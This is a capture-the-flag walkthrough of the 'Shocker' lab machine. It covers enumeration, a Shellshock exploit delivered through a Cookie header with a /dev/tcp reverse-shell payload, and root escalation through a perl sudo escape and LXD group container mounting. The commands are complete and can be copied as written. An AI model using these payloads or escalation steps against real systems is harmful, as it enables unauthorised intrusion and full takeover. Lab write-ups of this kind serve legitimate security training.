# Shocker
```
Difficulty: Easy
Operating System: Linux
Hints: True
```


### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `shelly` | Nmap, Dirb, Shellshock (CVE-2014-6271) | An Nmap scan revealed ports 80 (HTTP) and 2222 (SSH) were open. Dirb identified a `/cgi-bin/` directory containing a `user.sh` script. The script was found to be vulnerable to Shellshock, as confirmed by the `http-shellshock.nse` Nmap script. The vulnerability was exploited by crafting a malicious `Cookie` header in an HTTP request to the `user.sh` script, which allowed for command injection. |
| 2 | `shelly` | Reverse Shell | A reverse shell payload was injected into the vulnerable `Cookie` header, which was then executed by the web server. This granted a shell as the user `shelly`. |
| 3 | `root` | `sudo` Misconfiguration (GTFOBins) | Upon gaining access as `shelly`, a `sudo -l` command revealed a misconfiguration allowing the user to run `/usr/bin/perl` as `root` without a password. This misconfiguration was exploited using a payload from GTFOBins, which executed a shell with root privileges. |
| 4 | `root` | `LXD` Privilege Escalation (Alternative Method) | As an alternative path to root, it was noted that the user `shelly` was a member of the `lxd` group. This is a known privilege escalation vector. An Alpine Linux image was built, imported into LXD on the target machine, and configured to mount the host's root file system. A shell was then executed within the container, providing access to the host's root directory and the final flag. |
| 5 | `root` | Final Flag | Both methods successfully led to a root shell, allowing retrieval of the final flag. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
Nmap scan report for 10.10.10.56
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Before further going we can see that this box is running Ubuntu and a vulnerable version of OpenSSH that can allow us to enumerate system's users.  
Now let's keep this in mind and dig deeper into port 80.
Here if we run gobuster we found nothing, but using dirb we can discover the following directory:
```
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)
+ http://10.10.10.56/index.html (CODE:200|SIZE:137)
+ http://10.10.10.56/server-status (CODE:403|SIZE:299)
```
Common Gateway Interface (CGI) is an interface specification that enables web servers to execute an external program, typically to process user requests.  
Such programs are often written in a scripting language and are commonly referred to as CGI scripts, but they may include compiled programs.  
So, let's get deeper and try to enumerate using dirb the /cgi-bin directory for commong scripting extensions like .sh and .pl.  
As we can see we get the following result:
```
+ http://10.10.10.56/cgi-bin/user.sh (CODE:200|SIZE:119)
```
If we send an HTTP request, we can see the following page:
```
HTTP/1.1 200 OK
Date: Mon, 15 Nov 2021 16:20:38 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 118

Content-Type: text/plain

Just an uptime test script
 11:20:38 up  4:46,  0 users,  load average: 0.00, 0.00, 0.00
```
So, it seems like that a bash script is executing an uptime command for generating the response.  
When a web server uses the Common Gateway Interface (CGI) to handle a document request, it copies certain information from the request into the environment variable list and then delegates the request to a handler program.  
If the handler is a Bash script, or if it executes one for example using the system call, Bash will receive the environment variables passed by the server and will process them as described above.  
This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted document request.
Shellshock affects bash 1.0.3-4.3 [from this page](https://packages.ubuntu.com/xenial/allpackages) we can see that shellshock maybe is unavailable for this version of Ubuntu.  
Let's check it anyway, using the dedicated nmap plugin
```
[root@kali Shocker ]$ locate .nse | grep shellshock
/usr/share/nmap/scripts/http-shellshock.nse
```
Now we can open this nmap plugin and see how to run this:
```
nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls $TARGET
```
And we do get the following output and see that the target is vulnerable to shellshock
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     Exploit results:
|       <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|   <html><head>
|   <title>500 Internal Server Error</title>
|   </head><body>
|   <h1>Internal Server Error</h1>
|   <p>The server encountered an internal error or
|   misconfiguration and was unable to complete
|   your request.</p>
|   <p>Please contact the server administrator at
|    webmaster@localhost to inform them of the time this error occurred,
|    and the actions you performed just before this error.</p>
|   <p>More information about this error may be available
|   in the server error log.</p>
|   <hr>
|   <address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
|   </body></html>
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

## User
To see how shellshock works and hopefully pop a shell we can open burp and go to Proxy > Options > Proxy Listeners and add a new listener on port 8081, setting the redirection to 10.10.10.56 port 80.  
Now, as the proxy is configured, we can connect to the server using 127.0.0.1:8081.  
So, let's start a further nmap scan with the following command.
```
nmap -sV -p8081 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=/bin/ls 127.0.0.1
```
Now, if we do open burp, we can go to HTTP History and see the command execution request generated by the nmap probe.  
We can edit the request as follow and obtain a shell with user shelly.
```
GET /cgi-bin/user.sh HTTP/1.1
Cookie: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.20/8082 0>&1
Host: localhost:8081
Connection: close
```
Proof:
```
[ root@kali Shocker ]$ nc -lvnp 8082
listening on [any] 8082 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.56] 57644
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```
## Root
### Method 1 - Sudo GTFOBins
Once we are logged in we can try a ```sudo -l``` and see our sudo capabilities, or with a more methodic approach let's run linPEAS.    
After we run linPEAS we can see the following marked as a highly probable privilege escalation vector:
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d                                                     
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                           
Matching Defaults entries for shelly on Shocker:                                                                      
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:                                                                
    (root) NOPASSWD: /usr/bin/perl
```
So, if we just [GTFOBins for Perl/sudo](https://gtfobins.github.io/gtfobins/perl/#sudo) we can escalate to root by simply:
```
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/sh";'
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Method 2 - LXD container manager
A far more complicated way to obtain the root flag is by building a container that mounts the / fs.
As we can see, after we run linPEAS we can see the following marked as a highly probable privilege escalation vector:
```
╔═══════════════════════════════════╣ Users Information ╠════════════════════════════════════                                                                  
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                                                                                                  
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)                                                                                          
```
As we can see here, user shelly is part of lxd group and hence we can try to escalate to root by building an alpine linux image that mounts the root fs as discribed [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation#users).  
LXD is Ubuntu’s system container manager. This is similar to virtual machines, however, instead using linux containers.  
The lxd group should be considered harmful in the same way the docker group is.  
Any member of the lxd group can immediately escalate their privileges to root on the host operating system.
To Exploit this vulnerability, first of all we need to run the following commands on our local machine:
```
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder/
bash build-alpine
```
After we run this command we can transfer the ```alpine-v3.14-x86_64-20211115_1157.tar.gz``` image to the remote server, and run the following command.
```
lxc image import ./alpine-v3.14-x86_64-20211115_1157.tar.gz --alias alpine
```
we do get the following error:
```
shelly@Shocker:/dev/shm$ lxc image import ./alpine-v3.12-x86_64-20200826_2058.tar.gz --alias alpine
Generating a client certificate. This may take a minute...                                                         
error: mkdir /.config: permission denied
```
This is due to an environment variable not set, probably due to the nature of our shell access to the system.  
Poking around the man, we can see:
```
Environment:                                                                                                       
  LXD_CONF         Path to an alternate client configuration directory                                             
  LXD_DIR          Path to an alternate server directory                                        
```
so let's change this to:
```                   
shelly@Shocker:/dev/shm$ export LXD_CONF="/dev/shm"
```
and proceed with the exploit.  
```
lxc image import ./alpine-v3.14-x86_64-20211115_1157.tar.gz --alias alpine
lxc image list # verify that the image is loaded
lxc init alpine alpine-container -c security.privileged=true
lxc config device add alpine-container alpine-device disk source=/ path=/mnt/root recursive=true
```
finally, we can start the container and run a bash shell:
```
lxc start alpine-container
lxc exec alpine-container /bin/sh
```
However, we mounted the host “/” directory to the directory “/mnt/root” in the alpine container.  
So if we visit “/mnt/root”, we can see the content of the “/” directory of the host OS.
```
shelly@Shocker:/dev/shm$ lxc exec alpine-container /bin/sh
cat /mnt/root/root/root.txt
606ecc631fd2f9d3bf0b671a8aaec7fe
```
